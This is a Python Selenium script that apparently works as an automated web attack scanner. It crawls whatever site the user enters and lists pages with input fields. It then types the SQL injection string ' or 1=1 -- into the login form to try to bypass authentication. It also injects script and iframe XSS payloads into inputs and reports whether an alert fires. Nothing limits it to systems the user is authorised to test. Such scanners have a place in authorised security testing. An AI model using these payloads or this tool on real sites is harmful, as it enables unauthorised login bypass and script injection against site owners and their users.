from time import sleep
from random import uniform
from soup_methods import find_links, find_buttons, find_inputs
from bs4 import BeautifulSoup
from init import initialize
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

def available_links(driver,site):
    domain = site.split('.')[0]
    driver.get(site)
    while len(queue) != 0 : 
        link = queue[0] 
        driver.get(f'{site}{link}')
        sleep(uniform(1.3,1.7))
        page = driver.page_source
        if '404' not in page :
            soup = BeautifulSoup(page,'html.parser')
            for ref in find_buttons(soup,queue,available):
                if ref not in queue:
                    queue.append(ref)
            for ref in find_links(soup,domain,queue,available):
                if ref not in queue:
                    queue.append(ref)
            available.add(queue.pop(0))
        else:
            queue.pop(0)
    print('Finished scanning for available links')

def check_form_val(driver,site):
    vulnerable_links=[]
    for link in available:
        driver.get(f'{site}{link}')
        sleep(uniform(1.5,1.8))
        page = driver.page_source
        soup = BeautifulSoup(page,'html.parser')
        if find_inputs(soup):
            vulnerable_links.append(link)
    print('Finished scanning for inputs\n')   
    if '#/login' in  vulnerable_links: #check if vulnerable_links have login link
        link2='/login'
        loginsqlinjection(site,link2,driver)
    else:
        print("page has no login ")
    return vulnerable_links


def loginsqlinjection(site,link2,driver): #check for sql injection
    print("Trying to enter site with sqlInjection")
    print("\n")
    driver.get(f'{site}{link2}') #open link in firefox browser
    sleep(3)
    soup = BeautifulSoup(driver.page_source,'html.parser') #search for all inputs in site
    inputs=soup.find_all('input')
    id_list=[]
    for iinput in inputs: #search  id tag in inputs 
        try:
            id = iinput['id']
            if 'mail' in id or 'pass'  in id:
                 id_list.append(id)  #append id tags for username/email and password in id_list
        except:
            pass
    driver.find_element_by_id(id_list[0]).send_keys("' or 1=1 -- ") #type in username/email field sqlinjection
    driver.find_element_by_id(id_list[1]).send_keys('222')
    driver.find_element_by_id(id_list[1]).send_keys(Keys.ENTER) 
    sleep(2)
    if 'Invalid' in driver.page_source: #check if sqlinjection succeeded and show proper message  
        print('login failed')
    else:
        print("Your page is vulnerable to sql injection")

def xssattack(driver,links):
    attacks = ['<script>alert("1")</script>','<iframe src="javascript:alert(`1`)">']
    for link in links:
        driver.get(f'{site}{link}')
        soup = BeautifulSoup(driver.page_source,'html.parser')
        inp = soup.find('input')
        try:
            class_name = inp['class']
            input_form = driver.find_element_by_class_name(class_name)
        except:
            id_name = inp['id']
            input_form = driver.find_element_by_id(id_name)

        flag = False
        driver.execute_script("arguments[0].click();", input_form)
        for attack in attacks:
            input_form.send_keys(attack)
            try:
                alert = WebDriverWait(driver,2).until(EC.alert_is_present())
                alert.accept()
                flag = True
            except:
                pass
        if flag == True:
            return link
    return None

if __name__ == '__main__':
    queue = list()
    available = set()
    driver = initialize()

    queue.append('/')
    available.add('/')

    site = input('Give site full url: ')
    print('Finding available urls of the given site')

    available_links(driver,site)

    print('Available Urls:')
    for link in available:
        print(f'---{link}')

    print('\n----------------- \n')

    vulnerable_links = check_form_val(driver,site)
    for vul_link in vulnerable_links:
        if 'login' in vul_link or 'signup' in vul_link:
            print(f'{vul_link} is probably vulnerable to Sql Injection')
        else:
            print(f'{vul_link} is probably vurnerable to XSS attack')

   # if '/login/' in  vulnerable_links: #check if link has login 
   #     loginsqlinjection(site,'/login/',driver)
    
    response = xssattack(driver,available)

    if response is None:
       print('Xss attacks failed')
    else:
       print('There are available xss attacks')
